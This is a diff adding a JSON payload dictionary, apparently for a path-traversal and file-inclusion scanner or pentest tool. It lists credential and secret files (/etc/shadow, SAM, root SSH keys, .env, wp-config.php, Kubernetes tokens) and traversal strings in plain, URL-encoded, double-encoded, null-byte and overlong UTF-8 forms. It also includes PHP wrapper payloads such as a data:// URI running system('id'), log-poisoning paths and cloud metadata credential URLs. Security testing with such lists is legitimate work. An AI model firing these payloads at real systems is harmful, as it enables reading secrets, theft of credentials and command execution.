@@ -1,0 +1,208 @@
+{
+  "linux": {
+    "files": [
+      "/etc/passwd",
+      "/etc/shadow",
+      "/etc/hosts",
+      "/etc/hostname",
+      "/etc/group",
+      "/etc/motd",
+      "/etc/issue",
+      "/etc/os-release",
+      "/etc/resolv.conf",
+      "/proc/self/environ",
+      "/proc/self/cmdline",
+      "/proc/self/status",
+      "/proc/version",
+      "/proc/cmdline"
+    ],
+    "signatures": [
+      "root:x:0:0:",
+      "root:.*:0:0:",
+      "daemon:.*:1:1:",
+      "bin:.*:2:2:",
+      "127\\.0\\.0\\.1",
+      "Linux version",
+      "PRETTY_NAME="
+    ]
+  },
+  "windows": {
+    "files": [
+      "C:\\windows\\win.ini",
+      "C:\\windows\\system32\\drivers\\etc\\hosts",
+      "C:\\boot.ini",
+      "C:\\Windows\\System.ini",
+      "C:\\Windows\\System32\\config\\SAM",
+      "C:\\Windows\\debug\\NetSetup.log",
+      "C:\\Windows\\Panther\\Unattend.xml",
+      "C:\\inetpub\\wwwroot\\web.config"
+    ],
+    "signatures": [
+      "\\[fonts\\]",
+      "\\[extensions\\]",
+      "\\[boot loader\\]",
+      "127\\.0\\.0\\.1"
+    ]
+  },
+  "traversals": {
+    "plain": [
+      "../",
+      "../../",
+      "../../../",
+      "../../../../",
+      "../../../../../",
+      "../../../../../../",
+      "../../../../../../../",
+      "../../../../../../../../",
+      "../../../../../../../../../",
+      "../../../../../../../../../../"
+    ],
+    "url-encoded": [
+      "%2e%2e%2f",
+      "%2e%2e/",
+      "..%2f",
+      "%2e%2e%5c",
+      "..%5c",
+      "..%2f..%2f..%2fetc%2fpasswd",
+      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    ],
+    "double-encoded": [
+      "%252e%252e%252f",
+      "%252e%252e/",
+      "..%252f",
+      "%252e%252e%255c",
+      "..%252f..%252f..%252fetc%252fpasswd",
+      "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+    ],
+    "null-byte": [
+      "%00",
+      "\u0000",
+      "../../../etc/passwd%00",
+      "../../../etc/passwd%00.php",
+      "../../../etc/passwd%00.jpg",
+      "../../../../etc/passwd%2500"
+    ],
+    "utf8": [
+      "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+      "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
+      "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd"
+    ],
+    "misc": [
+      "....//",
+      "..../",
+      "....\\\\",
+      "..;/",
+      "..%00/",
+      "..%0d/",
+      "..%5c",
+      "..\\/",
+      "%c0%ae%c0%ae/",
+      "%uff0e%uff0e/",
+      "....//....//....//etc/passwd",
+      "....\\\\....\\\\....\\\\windows\\\\win.ini",
+      "/etc/./passwd",
+      "/etc/../etc/passwd",
+      "//etc//passwd"
+    ]
+  },
+  "php-wrappers": [
+    "php://filter/convert.base64-encode/resource=",
+    "php://filter/read=string.rot13/resource=",
+    "php://filter/convert.iconv.utf-8.utf-16/resource=",
+    "php://filter/convert.quoted-printable-encode/resource=",
+    "php://filter/zlib.deflate/convert.base64-encode/resource=",
+    "php://filter/convert.iconv.IBM1047.UTF8/resource=",
+    "php://input",
+    "data://text/plain;base64,",
+    "data://text/plain,<?php system('id'); ?>",
+    "expect://",
+    "phar://",
+    "zip://"
+  ],
+  "log_poisoning": [
+    "/var/log/apache2/access.log",
+    "/var/log/apache/access.log",
+    "/var/log/httpd/access_log",
+    "/var/log/httpd-access.log",
+    "/var/log/apache2/error.log",
+    "/var/log/apache/error.log",
+    "/var/log/httpd/error_log",
+    "/var/log/nginx/access.log",
+    "/var/log/nginx/error.log",
+    "/var/log/auth.log",
+    "/var/log/secure",
+    "/var/log/mail.log",
+    "/var/log/vsftpd.log"
+  ],
+  "sensitive_linux": [
+    "/root/.ssh/id_rsa",
+    "/root/.ssh/id_rsa.pub",
+    "/root/.ssh/authorized_keys",
+    "/root/.bash_history",
+    "/root/.mysql_history",
+    "/etc/apache2/apache2.conf",
+    "/etc/apache2/sites-enabled/000-default.conf",
+    "/etc/nginx/nginx.conf",
+    "/etc/nginx/sites-enabled/default",
+    "/etc/crontab",
+    "/var/spool/cron/crontabs/root",
+    "/var/www/html/.env",
+    "/var/www/html/config.php",
+    "/var/www/html/wp-config.php",
+    "/var/www/html/.git/config",
+    "/proc/self/maps",
+    "/proc/self/mounts",
+    "/proc/self/net/arp",
+    "/proc/net/tcp",
+    "/proc/net/route"
+  ],
+  "sensitive_windows": [
+    "C:\\Windows\\Panther\\Unattended.xml",
+    "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config",
+    "C:\\inetpub\\logs\\LogFiles\\W3SVC1",
+    "C:\\xampp\\apache\\conf\\httpd.conf",
+    "C:\\xampp\\apache\\logs\\access.log",
+    "C:\\xampp\\php\\php.ini",
+    "C:\\xampp\\mysql\\data\\mysql\\user.MYD",
+    "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\config\\machine.config"
+  ],
+  "docker_container": [
+    "/.dockerenv",
+    "/proc/1/cgroup",
+    "/proc/self/cgroup",
+    "/var/run/docker.sock",
+    "/var/run/secrets/kubernetes.io/serviceaccount/token",
+    "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
+    "/run/secrets/kubernetes.io/serviceaccount/token"
+  ],
+  "application_configs": [
+    "../../../../wp-config.php",
+    "../../../../configuration.php",
+    "../../../../sites/default/settings.php",
+    "../../../../.env",
+    "../../.env",
+    "../.env",
+    "../../../../app/config/parameters.yml",
+    "../../../../config/database.yml",
+    "../../../../config/secrets.yml",
+    "../../../../config/master.key",
+    "../../../../.git/config",
+    "../../../../.git/HEAD",
+    ".git/config",
+    ".git/HEAD",
+    "../../../../../usr/local/tomcat/conf/tomcat-users.xml",
+    "../WEB-INF/web.xml",
+    "../../WEB-INF/web.xml",
+    "../../../../package.json",
+    "../../../../config/default.json"
+  ],
+  "cloud_metadata": [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "http://169.254.169.254/latest/user-data",
+    "http://metadata.google.internal/computeMetadata/v1/",
+    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    "http://169.254.169.254/metadata/v1/",
+    "http://169.254.169.254/opc/v1/instance/"
+  ]
+}
